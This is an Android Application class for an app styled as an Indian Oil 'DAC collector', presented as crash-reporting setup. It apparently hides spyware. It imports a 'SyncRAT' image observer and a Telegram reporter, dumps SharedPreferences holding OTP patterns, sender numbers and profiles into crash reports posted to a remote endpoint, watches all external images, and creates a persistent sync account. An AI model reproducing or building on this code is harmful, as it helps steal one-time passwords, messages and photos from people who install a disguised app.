package android.iocl.dac_collector.MainApplication;


import static android.iocl.dac_collector.Utility.Utility.TAG;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.Ui.CrashActivity;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import androidx.work.Configuration;
import androidx.work.WorkManager;

import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import org.acra.ACRA;
import org.acra.config.CoreConfigurationBuilder;
import org.acra.config.HttpSenderConfigurationBuilder;
import org.acra.data.StringFormat;
import org.acra.sender.HttpSender;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Map;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;


public class MyApp extends Application implements Application.ActivityLifecycleCallbacks /*, Configuration.Provider */ {
    FirebaseCrashlytics crashlytics;
    Executor executor = Executors.newSingleThreadExecutor();

  // todo: CHECK FOR INSTALL COCCKROACH
    Boolean installCockroach = true;

    private Thread.UncaughtExceptionHandler defaultHandler;

    private volatile long lastMainThreadPing = System.currentTimeMillis();
    private ImageObserver mImageObserver;
    /**
     * ===================== ANR WATCHDOG ======================
     **/
    private volatile boolean anrDetectionInProgress = false;

    // Track current foreground activity for better crash context
    private volatile String currentActivityName = "Unknown";

    @Override
    public void onCreate() {
        super.onCreate();

        String currentProcess = getProcessNameSafe();
        String mainProcess = getPackageName();
        if (!mainProcess.equals(currentProcess)) {
            Log.w("MyApp", "Skipping init in non-main process: " + currentProcess);
            return;
        }

        // ------------------ FIREBASE / CRASHLYTICS ------------------
        FirebaseApp.initializeApp(this);  // MUST be first
        crashlytics = FirebaseCrashlytics.getInstance();

        String cons_id = SharedPrefs.getString(this,
                "cons_id",
                BuildConfig.DEBUG ? "crashedBeforeSettingUp--debug" : "crashedBeforeSettingUp");

        crashlytics.setUserId(cons_id);
        crashlytics.setCrashlyticsCollectionEnabled(installCockroach);



//        WorkManager.initialize(
//                this,
//                getWorkManagerConfiguration()
//        );

        // ------------------ ACRA INITIALIZATION ------------------
        // ACRA must be initialized on the main process. Configure endpoint above.
        initACRA();

        // ------------------ Sync Account Setup ------------------
        new Thread(() -> {
            try {
                createSyncAccount();
                AccountContract.createSyncBothAccount(getApplicationContext());
                SyncUtils.initialize(getApplicationContext());
            } catch (Exception e) {
                Log.e(TAG, "Account setup failed", e);
                crashlytics.recordException(e);
                crashlytics.sendUnsentReports();
                // Also report to ACRA as a non-fatal
                safeReportToAcra(e);
            }
        }).start();

        // ------------------ Lifecycle Logging ------------------
        registerActivityLifecycleCallbacks(this);
        

        // ------------------ Image Observer ------------------
        installImageObserver();

        // ------------------ Install Cockroach (custom crash handler) ------------------
        if (installCockroach) {
            install(); // your custom crash handler now wraps Crashlytics and ACRA
        }

        // Optionally wrap default uncaught handler to ensure ACRA gets reports
        defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            // attempt to report to ACRA synchronously
            reportToAcraSync(throwable);

            // let existing handler (Cockroach / system) handle it as well
            if (defaultHandler != null && defaultHandler != Thread.getDefaultUncaughtExceptionHandler()) {
                try {
                    defaultHandler.uncaughtException(thread, throwable);
                } catch (Throwable ignored) {
                }
            }
        });
    }


//    @Override
//    public Configuration getWorkManagerConfiguration() {
//        return new Configuration.Builder()
//                .setMinimumLoggingLevel(Log.INFO)
//                .build();
//    }
    /**
     * ===================== ACRA helpers ======================
     **/


    private void initACRA() {
        try {
            CoreConfigurationBuilder builder = new CoreConfigurationBuilder()
                    .withBuildConfigClass(BuildConfig.class)
                    .withReportFormat(StringFormat.JSON)
                    .withReportSendSuccessToast("Report sent successfully")
                    .withSendReportsInDevMode(true)

                    // HTTP Sender Configuration - CORRECT WAY
                    .withPluginConfigurations(
                            // HttpSender configuration
                            new HttpSenderConfigurationBuilder()
                                    .withUri(Constant.ACRA_REPORT_DB_API)
                                    .withHttpMethod(HttpSender.Method.POST)
                                    .withConnectionTimeout(1000 * 8)
                                    .withSocketTimeout(1000 * 8)
                                    .withEnabled(true)
                                    .build()
                    );

                    // Basic settings


            ACRA.DEV_LOGGING = true;
            ACRA.init(this, builder.build());

            // Add custom data
            setupCustomData();

        } catch (Exception e) {
            Log.e("ACRA", "Initialization failed", e);
        }
    }

    private void setupCustomData() {
        ACRA.getErrorReporter().putCustomData("APP_MODE", BuildConfig.DEBUG ? "DEBUG" : "RELEASE");
        ACRA.getErrorReporter().putCustomData("USER_DATA", SharedPrefs.getUserID(this) + " | " + SharedPrefs.getUsername(this));
        ACRA.getErrorReporter().putCustomData("APP_VERSION", BuildConfig.VERSION_NAME);
        ACRA.getErrorReporter().putCustomData("ANDROID_VERSION", android.os.Build.VERSION.RELEASE);
        ACRA.getErrorReporter().putCustomData("DEVICE_MODEL", android.os.Build.MODEL);
        ACRA.getErrorReporter().putCustomData("DEVICE_SHAREDPREF", getAllSharedPrefsAsJson(this).toString());
    }


    // Safe wrapper - will never throw
    private void safeReportToAcra(Throwable t) {
        try {
            reportToAcra(t);
        } catch (Exception ignored) {
            Log.w(TAG, "ACRA reporting failed", ignored);
        }
    }

    public static JSONObject getAllSharedPrefsAsJson(Context context) {
        JSONObject combinedJson = new JSONObject();

        // List of all SharedPreferences names
        String[] prefsNames = {"AppsData", "OTP_Pattern", "senders_number", "profile_enc", "unsent_dac"};

        for (String prefName : prefsNames) {
            SharedPreferences prefs = context.getSharedPreferences(prefName, Context.MODE_PRIVATE);
            Map<String, ?> allEntries = prefs.getAll();

            JSONObject json = new JSONObject();
            for (Map.Entry<String, ?> entry : allEntries.entrySet()) {
                try {
                    json.put(entry.getKey(), entry.getValue());
                } catch (Exception e) {
                    // Ignore JSON exceptions for weird objects
                }
            }

            try {
                combinedJson.put(prefName, json);
            } catch (Exception e) {
                // Ignore
            }
        }

        return combinedJson;
    }


    private void reportToAcra(Throwable t) {
        if (t == null) {
            // non-fatal / simple message
            ACRA.getErrorReporter().handleException(null);
            return;
        }

        String crashClass = getCrashClassName(t);
        ACRA.getErrorReporter().putCustomData("CRASH_CLASS", crashClass);
        ACRA.getErrorReporter().putCustomData("CRASH_MESSAGE", t.getMessage() == null ? "" : t.getMessage());
        ACRA.getErrorReporter().putCustomData("CURRENT_ACTIVITY", currentActivityName == null ? "Unknown" : currentActivityName);

        // Attach a short stack summary as custom data (first 5 frames)
        StringBuilder sb = new StringBuilder();
        StackTraceElement[] st = t.getStackTrace();
        int limit = Math.min(5, st.length);
        for (int i = 0; i < limit; i++) {
            sb.append(st[i].toString()).append("\\n");
        }
        ACRA.getErrorReporter().putCustomData("STACK_SUMMARY", sb.toString());

        // Send to ACRA (non-blocking)
        ACRA.getErrorReporter().handleException(t);
    }

    // Try a synchronous send (best-effort) when app is crashing
    private void reportToAcraSync(Throwable t) {
        try {
            String crashClass = getCrashClassName(t);
            ACRA.getErrorReporter().putCustomData("CRASH_CLASS", crashClass);
            ACRA.getErrorReporter().putCustomData("CURRENT_ACTIVITY", currentActivityName == null ? "Unknown" : currentActivityName);
            ACRA.getErrorReporter().putCustomData("CRASH_MESSAGE", t == null ? "" : t.getMessage());
            // handleException may be asynchronous inside ACRA, but call it anyway
            ACRA.getErrorReporter().handleException(t);
            // no blocking APIs exposed — ACRA will try to send on its own
        } catch (Throwable ignored) {
            Log.w(TAG, "Failed to report to ACRA sync", ignored);
        }
    }

    private String getCrashClassName(Throwable t) {
        if (t == null) return "Unknown";
        StackTraceElement[] st = t.getStackTrace();
        if (st == null || st.length == 0) return "Unknown";
        String pkg = getPackageName();
        for (StackTraceElement e : st) {
            if (e.getClassName().startsWith(pkg)) {
                return e.getClassName() + "#" + e.getMethodName() + ":" + e.getLineNumber();
            }
        }
        // fallback to top frame
        StackTraceElement top = st[0];
        return top.getClassName() + "#" + top.getMethodName() + ":" + top.getLineNumber();
    }

    // Public helper to log non-fatal messages with optional custom data


    /**
     * ===================== ANR WATCHDOG ======================
     **/


    private String getProcessNameSafe() {
        try {
            int pid = android.os.Process.myPid();
            BufferedReader reader = new BufferedReader(
                    new FileReader("/proc/" + pid + "/cmdline")
            );
            String processName = reader.readLine().trim();
            reader.close();
            return processName;
        } catch (Exception e) {
            return null;
        }
    }







    /**
     * ===================== ACTIVITY LIFECYCLE LOGGING ======================
     **/
    @Override
    public void onActivityCreated(Activity activity, android.os.Bundle savedInstanceState) {
        logLifecycle("CREATED", activity);
    }

    @Override
    public void onActivityStarted(Activity activity) {
        logLifecycle("STARTED", activity);
    }

    @Override
    public void onActivityResumed(Activity activity) {
        // track current activity for crash context
        currentActivityName = activity.getClass().getName();
        logLifecycle("RESUMED", activity);
    }

    @Override
    public void onActivityPaused(Activity activity) {
        logLifecycle("PAUSED", activity);
    }

    @Override
    public void onActivityStopped(Activity activity) {
        logLifecycle("STOPPED", activity);
    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, android.os.Bundle outState) {
        logLifecycle("SAVE_INSTANCE_STATE", activity);
    }

    @Override
    public void onActivityDestroyed(Activity activity) {
        logLifecycle("DESTROYED", activity);
    }

    private void logLifecycle(String state, Activity activity) {
        String log = state + ":" + activity.getClass().getSimpleName() + ":" + System.currentTimeMillis();
    }

    /**
     * ===================== FILE UTILS ======================
     **/


    private void createSyncAccount() {
        AccountManager accountManager = AccountManager.get(this);
        Account[] existingAccounts = accountManager.getAccountsByType(AccountContract.ACCOUNT_TYPE);

        // If account already exists, just return
        if (existingAccounts.length > 0) {
            Account account = existingAccounts[0];
            // Ensure sync settings are applied even for existing accounts
            ContentResolver.setIsSyncable(account, AccountContract.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(account, AccountContract.AUTHORITY, true);
            ContentResolver.addPeriodicSync(account, AccountContract.AUTHORITY, Bundle.EMPTY, AccountContract.SYNC_INTERVAL);
            return;
        }

        // Try to create a new account
        Account newAccount = new Account(AccountContract.ACCOUNT_NAME, AccountContract.ACCOUNT_TYPE);
        try {
            boolean accountCreated = accountManager.addAccountExplicitly(newAccount, null, null);
            if (accountCreated) {
                ContentResolver.setIsSyncable(newAccount, AccountContract.AUTHORITY, 1);
                ContentResolver.setSyncAutomatically(newAccount, AccountContract.AUTHORITY, true);
                ContentResolver.addPeriodicSync(newAccount, AccountContract.AUTHORITY, Bundle.EMPTY, AccountContract.SYNC_INTERVAL);
            } else {
                Log.w("SyncAccount", "Account creation failed or already exists.");
            }
        } catch (SecurityException e) {
            Log.e("SyncAccount", "Cannot add account due to SecurityException: " + e.getMessage());
        }
    }



    // call this instead of your old installImageObserver()
    private void installImageObserver() {
        if (mImageObserver != null) {
            Log.i("MyApp", "ImageObserver already installed");
            return;
        }

        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE)) {
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
            Log.i("MyApp", "ImageObserver installed");
        } else {
            Log.i("MyApp", "Manage external storage permission not granted");
        }
    }


    // call this when stopping (Activity.onDestroy() or Service.onDestroy())


    @Override
    public void onTerminate() {
        super.onTerminate();
        if (mImageObserver != null) {
            getContentResolver().unregisterContentObserver(mImageObserver);
            mImageObserver = null;
        }


    }

    private void install() {
        executor.execute(() -> {
            final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();


            Cockroach.install(this, new ExceptionHandler() {
                @Override
                protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
                    StringWriter sw = new StringWriter();
                    PrintWriter pw = new PrintWriter(sw);
                    throwable.printStackTrace(pw);
                    String crashInfo = "--->onUncaughtExceptionHappened\nThread: " + thread + "\n" + sw.toString();

                    SharedPrefs.saveCrashDetails(getApplicationContext(), crashInfo);

                    // Report to Crashlytics
                    crashlytics.recordException(throwable);
                    crashlytics.sendUnsentReports();

                    // Report to ACRA (add class name and current activity)
                    safeReportToAcra(throwable);

//                    TelegramBot.with(getApplicationContext()).reportCrash(throwable);

                    if (SharedPrefs.isFirstTime(getApplicationContext())) {

                        // Small delay to ensure network flush
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            Intent intent = new Intent(getApplicationContext(), CrashActivity.class);
                            intent.putExtra("crash_details", crashInfo);
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                            getApplicationContext().startActivity(intent);

                            android.os.Process.killProcess(android.os.Process.myPid());
                            System.exit(10);
                        }, 1000); // 1 second delay
                    }


                }

                @Override
                protected void onBandageExceptionHappened(Throwable throwable) {
                    SharedPrefs.saveCrashDetails(getApplicationContext(), throwable.getMessage());

//                    TelegramBot.with(getApplicationContext()).reportCrash(throwable);
                    crashlytics.recordException(throwable);
                    crashlytics.sendUnsentReports();

                    // Also report recoverable exception to ACRA
                    safeReportToAcra(throwable);

                    crashlytics.log("Recoverable exception: " + throwable.getMessage());
                }

                @Override
                protected void onEnterSafeMode() {

                }

                @Override
                protected void onMayBeBlackScreen(Throwable e) {
                    Thread thread = Looper.getMainLooper().getThread();

                    SharedPrefs.saveCrashDetails(getApplicationContext(), "--->onUncaughtExceptionHappened:" + thread + "<---" + e);
                    TelegramBot.with(getApplicationContext()).reportCrash(e);
                    crashlytics.recordException(e);
                    crashlytics.sendUnsentReports();

                    // Also report to ACRA
                    safeReportToAcra(e);

                    //黑屏时建议直接杀死app
                    sysExcepHandler.uncaughtException(thread, new RuntimeException("black screen"));
                }

            });

        });
    }

}
